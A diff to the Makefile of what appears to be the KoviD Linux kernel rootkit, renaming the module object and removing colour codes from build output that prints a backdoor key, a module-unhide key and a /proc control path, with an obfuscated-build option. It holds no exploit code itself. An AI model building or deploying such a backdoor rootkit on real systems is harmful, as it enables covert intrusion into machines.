@@ -28,13 +28,13 @@ endif
 ifndef OBFUSCATE
 # PROCNAME, /proc/<name> interface.
 COMPILER_OPTIONS := -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
-	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
+	-DMODNAME='"$(OBJNAME)"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
 	-DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) -DUUIDGEN=\"$(UUIDGEN)\" \
 	-DJOURNALCTL=\"$(JOURNALCTL)\"
 else
 CC=gcc-12
 COMPILER_OPTIONS := -Wall -Wno-vla -DPROCNAME='"$(PROCNAME)"' \
-	-DMODNAME='"kovid"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
+	-DMODNAME='"$(OBJNAME)"' -DKSOCKET_EMBEDDED ${DEBUG_PR} -DCPUHACK \
 	-DCPUHACK -DPRCTIMEOUT=$(PRCTIMEOUT) -DUUIDGEN=\"$(UUIDGEN)\" \
 	-DJOURNALCTL=\"$(JOURNALCTL)\" \
     -fno-inline \
@@ -43,7 +43,7 @@ endif
 
 EXTRA_CFLAGS := -I$(src)/src -I$(src)/fs ${COMPILER_OPTIONS}
 
-SRC := src/${OBJNAME}.c src/pid.c src/fs.c src/sys.c \
+SRC := src/kovid.c src/pid.c src/fs.c src/sys.c \
 	src/sock.c src/util.c src/vm.c src/crypto.c src/tty.c
 
 EBPF_C_SRC       := tools/ebpf/socket_filter_bpf.c
@@ -71,15 +71,17 @@ all:
 	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 	@echo "Build complete."
 	@echo -n "Backdoor KEY: "
-	@echo "\033[1;37m$(BDKEY)\033[0m" | sed 's/0x//'
+	@echo "$(BDKEY)" | sed 's/0x//'
 	@echo -n "LKM unhide KEY: "
-	@echo "\033[1;37m$(UNHIDEKEY)\033[0m" | sed 's/0x//'
-	@echo "UI: \033[1;37m/proc/$(PROCNAME)\033[0m"
+	@echo "$(UNHIDEKEY)" | sed 's/0x//'
+	@echo "UI: /proc/$(PROCNAME)"
+	@echo "/proc/$(PROCNAME) timeout: $(PRCTIMEOUT)"
+	@echo "Object name: $(OBJNAME).ko"
 	@echo -n "Build type: "
 ifdef DEPLOY
-	@echo "\033[1;37mRELEASE\033[0m"
+	@echo "RELEASE"
 else
-	@echo "\033[1;37mDEBUG\033[0m"
+	@echo "DEBUG"
 endif
 ifdef OBFUSCATE
 	@echo "\033[1;37mObfuscated build with gcc-12 compiler\033[0m"
